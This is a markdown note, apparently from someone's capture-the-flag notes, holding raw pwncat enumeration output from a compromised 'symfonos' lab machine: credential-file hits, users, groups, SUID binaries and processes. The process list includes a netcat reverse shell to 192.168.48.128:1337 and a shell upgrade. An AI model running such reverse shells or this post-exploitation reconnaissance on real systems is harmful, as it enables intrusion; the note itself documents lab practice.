@@ -1,0 +1,366 @@
+---
+title: "symfonosPwncatEnumerateOutput"
+tags:
+  - fetus
+---
+```sh
+Module 'enumerate' Results
+system.aslr facts
+  - enabled
+network.host facts
+  - 127.0.1.1 -> symfonos
+  - ::1 -> localhost, ip6-localhost, ip6-loopback
+  - ff02::1 -> ip6-allnodes
+  - ff02::2 -> ip6-allrouters
+creds.password facts
+  - Potential Password at /var/www/html/h3l105/wp-login.php:563
+  - Potential Password at /var/www/html/h3l105/wp-login.php:564
+  - Potential Password at /var/www/html/h3l105/wp-login.php:1059
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js:856
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.min.js:3
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/site-editor/editor/assets/libs/tinymce/tinymce.min.js:2
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/site-editor/editor/assets/js/siteeditor/siteeditor-base.js:416
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/site-editor/editor/assets/js/siteeditor.min.js:1
+  - Potential Password at /var/www/html/h3l105/wp-content/plugins/site-editor/editor/assets/js/frontend-editor.min.js:1
+  - Potential Password at 
+/var/www/html/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/pagebuilder-options-manager.class.php:168
+  - Potential Password at /var/www/html/h3l105/wp-admin/user-new.php:498
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:40
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:76
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:77
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:79
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:83
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:101
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:117
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/upgrade.php:596
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/class-wp-importer.php:204
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/user.php:785
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/meta-boxes.php:153
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/meta-boxes.php:184
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/post.php:282
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/post.php:684
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/post.php:824
+  - Potential Password 'anon@ftp.com' (/var/www/html/h3l105/wp-admin/includes/class-ftp.php:147)
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/class-ftp.php:364
+  - Potential Password 'anon@anon.com' (/var/www/html/h3l105/wp-admin/includes/class-ftp.php:365)
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/schema.php:1179
+  - Potential Password at /var/www/html/h3l105/wp-admin/includes/schema.php:1189
+  - Potential Password at /var/www/html/h3l105/wp-admin/network/site-users.php:68
+  - Potential Password at /var/www/html/h3l105/wp-admin/network/user-new.php:50
+  - Potential Password 'N/A' (/var/www/html/h3l105/wp-admin/network/site-new.php:105)
+  - Potential Password at /var/www/html/h3l105/wp-admin/network/site-new.php:121
+  - Potential Password at /var/www/html/h3l105/wp-admin/setup-config.php:367
+  - Potential Password at /var/www/html/h3l105/wp-admin/install.php:146
+  - Potential Password at /var/www/html/h3l105/wp-admin/install.php:361
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/user-profile.js:453
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/updates.min.js:1
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/updates.js:103
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/updates.js:238
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/updates.js:1740
+  - Potential Password at /var/www/html/h3l105/wp-admin/js/user-profile.min.js:1
+  - Potential Password at /var/www/html/h3l105/wp-activate.php:180
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:669
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:871
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1098
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1270
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1364
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1671
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1744
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1829
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:1896
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2001
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2104
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2219
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2297
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2361
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2453
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2517
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2595
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2664
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2744
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2799
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2879
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2925
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:2984
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3019
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3081
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3086
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3144
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3204
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3247
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3298
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3380
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3431
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3481
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3532
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3618
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3684
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3783
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3918
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:3953
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4000
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4034
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4068
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4103
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4166
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4222
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4273
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4329
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4397
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4460
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4522
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4608
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4676
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4757
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4801
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4857
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:4953
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5029
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5104
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5188
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5264
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5266
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5564
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5613
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5628
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5894
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:5991
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6034
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6124
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6159
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6217
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6333
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6395
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6447
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6500
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-xmlrpc-server.php:6624
+  - Potential Password at /var/www/html/h3l105/wp-includes/post-template.php:1713
+  - Potential Password at /var/www/html/h3l105/wp-includes/deprecated.php:41
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-post.php:111
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-query.php:1385
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-wp-query.php:2375
+  - Potential Password at /var/www/html/h3l105/wp-includes/user.php:3560
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:1135
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:1177
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:1226
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:1546
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:1556
+  - Potential Password at /var/www/html/h3l105/wp-includes/ms-functions.php:2211
+  - Potential Password at /var/www/html/h3l105/wp-includes/pluggable-deprecated.php:104
+  - Potential Password at /var/www/html/h3l105/wp-includes/script-loader.php:1605
+  - Potential Password at /var/www/html/h3l105/wp-includes/post.php:3400
+  - Potential Password at /var/www/html/h3l105/wp-includes/post.php:3623
+  - Potential Password at /var/www/html/h3l105/wp-includes/post.php:3625
+  - Potential Password at /var/www/html/h3l105/wp-includes/general-template.php:464
+  - Potential Password at /var/www/html/h3l105/wp-includes/general-template.php:468
+  - Potential Password at /var/www/html/h3l105/wp-includes/class-phpmailer.php:287
+  - Potential Password at /var/www/html/h3l105/wp-includes/pluggable.php:523
+  - Potential Password at /var/www/html/h3l105/wp-includes/pluggable.php:2380
+  - Potential Password at /var/www/html/h3l105/wp-includes/wp-db.php:630
+  - Potential Password at /var/www/html/h3l105/wp-includes/load.php:423
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/wp-lists.js:725
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/tinymce/wp-tinymce.js:3
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/tinymce/tinymce.min.js:2
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/plupload/moxie.min.js:2
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/plupload/moxie.js:4804
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/plupload/moxie.js:5374
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:5625
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9916
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9918
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9932
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9948
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9959
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9962
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9978
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:9989
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:10049
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:10059
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.js:10062
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/vendor/react-dom.js:2190
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/vendor/react-dom.min.js:42
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/vendor/react-dom.min.js:174
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/dist/editor.min.js:17
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/zxcvbn.min.js:9
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/zxcvbn.min.js:25
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/wp-lists.min.js:1
+  - Potential Password at /var/www/html/h3l105/wp-includes/js/jquery/jquery.js:2
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php:82
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php:104
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:1061
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:1952
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php:1159
+  - Potential Password at /var/www/html/h3l105/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php:1286
+  - Potential Password at /etc/exim4/exim4.conf.template:1900
+  - Potential Password at /etc/exim4/exim4.conf.template:1936
+  - Potential Password at /etc/exim4/exim4.conf.template:2011
+  - Potential Password at /etc/exim4/conf.d/auth/30_exim4-config_examples:50
+  - Potential Password at /etc/exim4/conf.d/auth/30_exim4-config_examples:86
+  - Potential Password at /etc/exim4/conf.d/auth/30_exim4-config_examples:161
+  - Potential Password at /etc/apache2/sites-available/default-ssl.conf:79
+  - Potential Password at /etc/ssl/openssl.cnf:113
+  - Potential Password at /etc/ssl/openssl.cnf:114
+  - Potential Password at /etc/ssl/openssl.cnf:157
+  - Potential Password at /etc/samba/smb.conf:108
+  - Potential Password at /etc/php/7.0/cli/php.ini:1109
+  - Potential Password at /etc/php/7.0/apache2/php.ini:1109
+system.network.interface facts
+  - Interface lo w/ address 127.0.0.1/8
+  - Interface lo w/ address ::1/128
+  - Interface ens33 w/ address 192.168.48.134/24
+  - Interface ens33 w/ address fe80::20c:29ff:fe95:12de/64
+user facts
+  - User(uid=0, name='root')
+  - User(uid=1, name='daemon')
+  - User(uid=2, name='bin')
+  - User(uid=3, name='sys')
+  - User(uid=4, name='sync')
+  - User(uid=5, name='games')
+  - User(uid=6, name='man')
+  - User(uid=7, name='lp')
+  - User(uid=8, name='mail')
+  - User(uid=9, name='news')
+  - User(uid=10, name='uucp')
+  - User(uid=13, name='proxy')
+  - User(uid=33, name='www-data')
+  - User(uid=34, name='backup')
+  - User(uid=38, name='list')
+  - User(uid=39, name='irc')
+  - User(uid=41, name='gnats')
+  - User(uid=65534, name='nobody')
+  - User(uid=100, name='systemd-timesync')
+  - User(uid=101, name='systemd-network')
+  - User(uid=102, name='systemd-resolve')
+  - User(uid=103, name='systemd-bus-proxy')
+  - User(uid=104, name='_apt')
+  - User(uid=105, name='Debian-exim')
+  - User(uid=106, name='messagebus')
+  - User(uid=107, name='sshd')
+  - User(uid=1000, name='helios')
+  - User(uid=108, name='mysql')
+  - User(uid=109, name='postfix')
+system.init facts
+  - Running Init.SYSTEMD
+group facts
+  - Group(gid=0, name='root', members=["UID('root')"])
+  - Group(gid=1, name='daemon', members=["UID('daemon')"])
+  - Group(gid=2, name='bin', members=["UID('bin')"])
+  - Group(gid=3, name='sys', members=["UID('sys')"])
+  - Group(gid=4, name='adm', members=[])
+  - Group(gid=5, name='tty', members=[])
+  - Group(gid=6, name='disk', members=[])
+  - Group(gid=7, name='lp', members=["UID('lp')"])
+  - Group(gid=8, name='mail', members=["UID('mail')"])
+  - Group(gid=9, name='news', members=["UID('news')"])
+  - Group(gid=10, name='uucp', members=["UID('uucp')"])
+  - Group(gid=12, name='man', members=["UID('man')"])
+  - Group(gid=13, name='proxy', members=["UID('proxy')"])
+  - Group(gid=15, name='kmem', members=[])
+  - Group(gid=20, name='dialout', members=[])
+  - Group(gid=21, name='fax', members=[])
+  - Group(gid=22, name='voice', members=[])
+  - Group(gid=24, name='cdrom', members=["UID('helios')"])
+  - Group(gid=25, name='floppy', members=["UID('helios')"])
+  - Group(gid=26, name='tape', members=[])
+  - Group(gid=27, name='sudo', members=[])
+  - Group(gid=29, name='audio', members=["UID('helios')"])
+  - Group(gid=30, name='dip', members=["UID('helios')"])
+  - Group(gid=33, name='www-data', members=["UID('www-data')"])
+  - Group(gid=34, name='backup', members=["UID('backup')"])
+  - Group(gid=37, name='operator', members=[])
+  - Group(gid=38, name='list', members=["UID('list')"])
+  - Group(gid=39, name='irc', members=["UID('irc')"])
+  - Group(gid=40, name='src', members=[])
+  - Group(gid=41, name='gnats', members=["UID('gnats')"])
+  - Group(gid=42, name='shadow', members=[])
+  - Group(gid=43, name='utmp', members=[])
+  - Group(gid=44, name='video', members=["UID('helios')"])
+  - Group(gid=45, name='sasl', members=[])
+  - Group(gid=46, name='plugdev', members=["UID('helios')"])
+  - Group(gid=50, name='staff', members=[])
+  - Group(gid=60, name='games', members=["UID('games')"])
+  - Group(gid=100, name='users', members=[])
+  - Group(gid=65534, name='nogroup', members=["UID('sshd')"])
+  - Group(gid=101, name='systemd-journal', members=[])
+  - Group(gid=102, name='systemd-timesync', members=["UID('systemd-timesync')"])
+  - Group(gid=103, name='systemd-network', members=["UID('systemd-network')"])
+  - Group(gid=104, name='systemd-resolve', members=["UID('systemd-resolve')"])
+  - Group(gid=105, name='systemd-bus-proxy', members=["UID('systemd-bus-proxy')"])
+  - Group(gid=106, name='input', members=[])
+  - Group(gid=107, name='crontab', members=[])
+  - Group(gid=108, name='netdev', members=["UID('helios')"])
+  - Group(gid=109, name='Debian-exim', members=["UID('Debian-exim')"])
+  - Group(gid=110, name='ssl-cert', members=[])
+  - Group(gid=111, name='messagebus', members=["UID('messagebus')"])
+  - Group(gid=112, name='ssh', members=[])
+  - Group(gid=1000, name='helios', members=["UID('helios')"])
+  - Group(gid=113, name='sambashare', members=[])
+  - Group(gid=114, name='mysql', members=["UID('mysql')"])
+  - Group(gid=115, name='postfix', members=["UID('postfix')"])
+  - Group(gid=116, name='postdrop', members=[])
+system.mountpoint facts
+  - UUID=eb30c486-0c1e-420b-8b3a-ff48ca7a57b4 available to mount at / as ext4
+  - UUID=434158cb-a5e9-450c-99b8-796b15e9b3bb available to mount at none as swap
+  - /dev/sr0 available to mount at /media/cdrom0 as udf,iso9660
+system.kernel.version facts
+  - Running Linux Kernel 4.9.0-9-amd64
+system.arch facts
+  - Running on a x86_64 processor
+system.hostname facts
+  - symfonos
+system.distro facts
+  - Debian GNU/Linux 9 (stretch) (debian), Version 9, Build ID None.
+file.suid facts
+  - /usr/lib/eject/dmcrypt-get-device owned by root
+  - /usr/lib/dbus-1.0/dbus-daemon-launch-helper owned by root
+  - /usr/lib/openssh/ssh-keysign owned by root
+  - /usr/bin/passwd owned by root
+  - /usr/bin/gpasswd owned by root
+  - /usr/bin/newgrp owned by root
+  - /usr/bin/chsh owned by root
+  - /usr/bin/chfn owned by root
+  - /opt/statuscheck owned by root
+  - /bin/mount owned by root
+  - /bin/umount owned by root
+  - /bin/su owned by root
+  - /bin/ping owned by root
+system.process facts
+  -       root 1       0       /sbin/init
+  -       root 213     1       /lib/systemd/systemd-journald
+  -       root 241     1       /lib/systemd/systemd-udevd
+  -   systemd+ 299     1       /lib/systemd/systemd-timesyncd
+  -       root 353     1       /usr/sbin/rsyslogd -n
+  -   message+ 356     1       /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+  -       root 370     1       /lib/systemd/systemd-logind
+  -       root 372     1       /usr/sbin/cron -f
+  -       root 385     1       /sbin/agetty --noclear tty1 linux
+  -       root 391     1       /usr/sbin/sshd -D
+  -       root 502     1       /sbin/dhclient -nw
+  -       root 517     1       /usr/sbin/apache2 -k start
+  -       root 554     1       /usr/sbin/nmbd
+  -      mysql 603     1       /usr/sbin/mysqld
+  -     helios 621     517     /usr/sbin/apache2 -k start
+  -     helios 622     517     /usr/sbin/apache2 -k start
+  -     helios 623     517     /usr/sbin/apache2 -k start
+  -     helios 624     517     /usr/sbin/apache2 -k start
+  -     helios 625     517     /usr/sbin/apache2 -k start
+  -       root 663     1       /sbin/dhclient -4 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df 
+/var/lib/dhcp/dhclient6.ens33.leases ens33
+  -       root 824     1       /usr/lib/postfix/sbin/master -w
+  -    postfix 826     824     pickup -l -t unix -u -c
+  -    postfix 827     824     qmgr -l -t unix -u
+  -       root 900     1       /usr/sbin/smbd
+  -       root 901     900     /usr/sbin/smbd
+  -       root 902     900     /usr/sbin/smbd
+  -       root 905     900     /usr/sbin/smbd
+  -     helios 1007    517     /usr/sbin/apache2 -k start
+  -     helios 1225    1007    sh -c nc -e /bin/bash 192.168.48.128 1337
+  -     helios 1226    1225    bash
+  -     helios 1229    1226    bash
+  -     helios 1250    1229    /usr/bin/script -qc /bin/bash /dev/null
+  -     helios 1251    1250    sh -c /bin/bash
+  -     helios 1252    1251    /bin/bash
+  -     helios 1452    1252    ps -eo pid,ppid,uid,user,command --no-header -ww
+system.selinux facts - SELinux is unknown
+  bash: sestatus  command not found
+
+```
